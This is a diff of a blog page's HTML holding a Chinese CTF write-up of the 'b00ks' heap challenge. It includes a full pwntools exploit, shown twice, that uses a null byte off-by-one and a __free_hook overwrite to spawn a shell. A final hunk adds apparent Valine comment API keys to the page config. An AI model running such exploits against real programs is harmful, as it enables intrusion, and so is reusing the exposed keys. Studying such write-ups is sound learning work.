+<pre><code class="hljs assembly">malloc_hook = libc.symbols[&apos;__free_hook&apos;] + libcbase
+execve_addr = libcbase + 0x4526a</code></pre>
 
 <p> <strong>结论:</strong>  通过<code>libc base address</code>, 退出了<code>__free_hook</code>和<code>execve_addr</code>在程序中的实际位置.</p>
 <p><strong>7. 修改 get shell</strong></p>
 <p>通过先后修改<code>book1_description</code>和<code>book2_description</code>，可以实现任意地址写任意内容的功能。由于该程序启用了<code>FULL RELRO</code>保护措施，无法对<code>GOT</code>进行改写，但是可以改写<code>__free_hook</code>或<code>__malloc_hook</code>。</p>
 <p>通过<code>first b00k</code>修改<code>second b00k</code>的<code>description</code>指针为<code>__free_hook</code>, 在修改second b00k的description内容为<code>execve(&quot;/bin/sh&quot;, null, environ)</code>, 最后执行<code>free</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x55f276c74190:    0x0000000000000002    0x00007f282b7047a8 --</span><br><span class="line">0x55f276c741a0:    0x00007f282b7047a8    0x0000000000021000  |</span><br><span class="line">......                                                  |</span><br><span class="line">0x7f282b7047a8 &lt;__free_hook&gt;:  0x00007f306ff4726a    0x0000000000000000</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs assembly">0x55f276c74190:    0x0000000000000002    0x00007f282b7047a8 --
+0x55f276c741a0:    0x00007f282b7047a8    0x0000000000021000  |
+......                                                  |
+0x7f282b7047a8 &lt;__free_hook&gt;:  0x00007f306ff4726a    0x0000000000000000</code></pre>
 
 <p><strong>结论:</strong> 由于<code>__free_hook</code>里面的内容不为<code>NULL</code>, 遂执行内容指向的指令, 即<code>execve(&quot;/bin/sh&quot;, null, environ)</code></p>
 <h4 id="相关问题解答">相关问题解答<a class="post-anchor" href="#相关问题解答"></a></h4><p><strong>为什么第二个 b00k申请的空间那么大?</strong></p>
@@ -311,7 +426,91 @@
 <p>​    If we allocate a chunk bigger than the wilderness chunk, it  mmap’s a new area for use. And this area is adjacent to the libc’s bss  segment<br>简单的说, 申请小了不能够泄露出<code>libc base address</code></p>
 </blockquote>
 <p><strong>exp</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">elf = ELF(<span class="string">"./b00ks"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">p = process(<span class="string">"./b00ks"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_name</span><span class="params">(name)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"Enter author name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_book</span><span class="params">(size,name,des_size,des)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"\nEnter book name size: "</span>,str(size))</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter book name (Max 32 chars): "</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">"\nEnter book description size: "</span>, str(des_size))</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter book description: "</span>, des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_book</span><span class="params">(id)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter the book id you want to delete: "</span>, str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_book</span><span class="params">(id,new_des)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"3"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter the book id you want to edit: "</span>, str(id))</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter new book description: "</span>, new_des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">memleak2</span><span class="params">()</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Name: "</span>)</span><br><span class="line">	msg=p.recvline().strip(<span class="string">"\n"</span>)</span><br><span class="line">    msg=u64(msg.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">    log.success(<span class="string">"Leaked address of second book name pointer : "</span> + hex(msg))</span><br><span class="line">    <span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(name)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"5"</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">"Enter author name: "</span>, name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">memleak1</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Author:"</span>)</span><br><span class="line">	msg = p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>)[<span class="number">33</span>:]</span><br><span class="line">	log.success(<span class="string">"msg : "</span>+msg)</span><br><span class="line">	addr = u64(msg.ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">	log.success(<span class="string">"Leaked address of first book : "</span> + hex(addr))</span><br><span class="line">	<span class="keyword">return</span> addr</span><br><span class="line">create_name(<span class="string">"a"</span>*<span class="number">32</span>)</span><br><span class="line">create_book(<span class="number">140</span>,<span class="string">"a"</span>,<span class="number">140</span>,<span class="string">"a"</span>)</span><br><span class="line"><span class="comment">#leak book addr</span></span><br><span class="line">first_addr = memleak1()</span><br><span class="line">second_addr = first_addr + <span class="number">0x38</span></span><br><span class="line">log.success(<span class="string">"second addr : "</span> + hex(second_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#create second book</span></span><br><span class="line">create_book(<span class="number">0x21000</span>,<span class="string">"a"</span>,<span class="number">0x21000</span>,<span class="string">"a"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake first book</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x40</span> + p64(<span class="number">1</span>) + p64(second_addr)*<span class="number">2</span> + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit_book(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#null byte off-by-one</span></span><br><span class="line">change_name(<span class="string">"a"</span>*<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak second book pointer</span></span><br><span class="line">sec_name_addr = memleak2()</span><br><span class="line"></span><br><span class="line">libcbase = sec_name_addr - <span class="number">0x5b0010</span></span><br><span class="line">log.info(<span class="string">"libcbase: %s"</span> % hex(libcbase))</span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>] + libcbase</span><br><span class="line">log.success(<span class="string">"free_hook : "</span> + hex(free_hook))</span><br><span class="line">execve_addr = libcbase + <span class="number">0x45216</span></span><br><span class="line">log.success(<span class="string">"execve : "</span> + hex(execve_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>] + libcbase</span><br><span class="line">binsh_addr = libc.search(<span class="string">'/bin/sh'</span>).next() + libcbase</span><br><span class="line">payload = p64(binsh_addr) + p64(free_hook)</span><br><span class="line">edit_book(<span class="number">1</span>, payload)</span><br><span class="line">payload = p64(system)</span><br><span class="line">edit_book(<span class="number">2</span>, payload)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">edit_book(1,p64(free_hook)*2)</span></span><br><span class="line"><span class="string">edit_book(2,p64(execve_addr))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">delete_book(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-comment">#context.log_level = 'debug'</span>
+elf = ELF(<span class="hljs-string">"./b00ks"</span>)
+libc = ELF(<span class="hljs-string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)
+p = process(<span class="hljs-string">"./b00ks"</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_name</span><span class="hljs-params">(name)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"Enter author name: "</span>, name)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_book</span><span class="hljs-params">(size,name,des_size,des)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"1"</span>)
+	p.sendlineafter(<span class="hljs-string">"\nEnter book name size: "</span>,str(size))
+	p.sendlineafter(<span class="hljs-string">"Enter book name (Max 32 chars): "</span>,name)
+	p.sendlineafter(<span class="hljs-string">"\nEnter book description size: "</span>, str(des_size))
+	p.sendlineafter(<span class="hljs-string">"Enter book description: "</span>, des)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_book</span><span class="hljs-params">(id)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"&gt; "</span>, <span class="hljs-string">"2"</span>)
+	p.sendlineafter(<span class="hljs-string">"Enter the book id you want to delete: "</span>, str(id))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit_book</span><span class="hljs-params">(id,new_des)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"3"</span>)
+	p.sendlineafter(<span class="hljs-string">"Enter the book id you want to edit: "</span>, str(id))
+	p.sendlineafter(<span class="hljs-string">"Enter new book description: "</span>, new_des)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">memleak2</span><span class="hljs-params">()</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"4"</span>)
+	p.recvuntil(<span class="hljs-string">"Name: "</span>)
+	msg=p.recvline().strip(<span class="hljs-string">"\n"</span>)
+    msg=u64(msg.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))
+    log.success(<span class="hljs-string">"Leaked address of second book name pointer : "</span> + hex(msg))
+    <span class="hljs-keyword">return</span> msg
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change_name</span><span class="hljs-params">(name)</span>:</span>
+	p.sendlineafter(<span class="hljs-string">"&gt; "</span>,<span class="hljs-string">"5"</span>)
+	p.sendlineafter(<span class="hljs-string">"Enter author name: "</span>, name)
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">memleak1</span><span class="hljs-params">()</span>:</span>
+	p.recvuntil(<span class="hljs-string">"&gt; "</span>)
+	p.sendline(<span class="hljs-string">"4"</span>)
+	p.recvuntil(<span class="hljs-string">"Author:"</span>)
+	msg = p.recvuntil(<span class="hljs-string">"\n"</span>,drop=<span class="hljs-literal">True</span>)[<span class="hljs-number">33</span>:]
+	log.success(<span class="hljs-string">"msg : "</span>+msg)
+	addr = u64(msg.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))
+	log.success(<span class="hljs-string">"Leaked address of first book : "</span> + hex(addr))
+	<span class="hljs-keyword">return</span> addr
+create_name(<span class="hljs-string">"a"</span>*<span class="hljs-number">32</span>)
+create_book(<span class="hljs-number">140</span>,<span class="hljs-string">"a"</span>,<span class="hljs-number">140</span>,<span class="hljs-string">"a"</span>)
+<span class="hljs-comment">#leak book addr</span>
+first_addr = memleak1()
+second_addr = first_addr + <span class="hljs-number">0x38</span>
+log.success(<span class="hljs-string">"second addr : "</span> + hex(second_addr))
+
+<span class="hljs-comment">#create second book</span>
+create_book(<span class="hljs-number">0x21000</span>,<span class="hljs-string">"a"</span>,<span class="hljs-number">0x21000</span>,<span class="hljs-string">"a"</span>)
+
+<span class="hljs-comment">#fake first book</span>
+payload = <span class="hljs-string">"a"</span>*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">1</span>) + p64(second_addr)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xffff</span>)
+edit_book(<span class="hljs-number">1</span>,payload)
+
+<span class="hljs-comment">#null byte off-by-one</span>
+change_name(<span class="hljs-string">"a"</span>*<span class="hljs-number">32</span>)
+
+<span class="hljs-comment">#leak second book pointer</span>
+sec_name_addr = memleak2()
+
+libcbase = sec_name_addr - <span class="hljs-number">0x5b0010</span>
+log.info(<span class="hljs-string">"libcbase: %s"</span> % hex(libcbase))
+free_hook = libc.symbols[<span class="hljs-string">'__free_hook'</span>] + libcbase
+log.success(<span class="hljs-string">"free_hook : "</span> + hex(free_hook))
+execve_addr = libcbase + <span class="hljs-number">0x45216</span>
+log.success(<span class="hljs-string">"execve : "</span> + hex(execve_addr))
+<span class="hljs-comment">#gdb.attach(p)</span>
+<span class="hljs-comment"># getshell</span>
+system = libc.symbols[<span class="hljs-string">'system'</span>] + libcbase
+binsh_addr = libc.search(<span class="hljs-string">'/bin/sh'</span>).next() + libcbase
+payload = p64(binsh_addr) + p64(free_hook)
+edit_book(<span class="hljs-number">1</span>, payload)
+payload = p64(system)
+edit_book(<span class="hljs-number">2</span>, payload)
+<span class="hljs-string">'''
+edit_book(1,p64(free_hook)*2)
+edit_book(2,p64(execve_addr))
+'''</span>
+delete_book(<span class="hljs-number">2</span>)
+p.interactive()</code></pre>
 
 
 
@@ -382,7 +581,7 @@
   
 </html>
 <script type="text/javascript">
-                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"service_worker\":{\"open\":false}}")
+                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"valine\":{\"API_ID\":\"vVaPNFdcK9dSGbIzRRK8Lynz-gzGzoHsz\",\"API_KEY\":\"dPlqFhVLg4CTqpRKmq7I0cQw\"},\"service_worker\":{\"open\":false}}")
                 </script> <script type="text/javascript">window.addEventListener('load', function() {
     
     window.loadJs = function(d, m, a) {
